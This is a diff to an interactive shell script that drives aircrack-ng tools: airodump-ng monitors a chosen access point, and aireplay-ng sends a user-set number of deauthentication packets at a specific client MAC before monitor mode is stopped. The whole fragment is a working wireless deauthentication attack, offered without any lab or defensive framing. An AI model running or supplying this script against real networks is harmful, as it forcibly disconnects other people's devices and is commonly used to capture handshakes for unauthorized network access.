@@ -26,6 +26,9 @@ airodump-ng --bssid $bssid --channel $channel wlan0mon
 echo "mac:"
 read 'mac'
 
-aireplay-ng -0 5 -a $bssid wlan0mon;echo "test"
+echo "number of packets:"
+read 'p'
+
+aireplay-ng -0 $p -a $bssid -c $mac wlan0mon;airmon-ng stop "$iface"mon
 
 
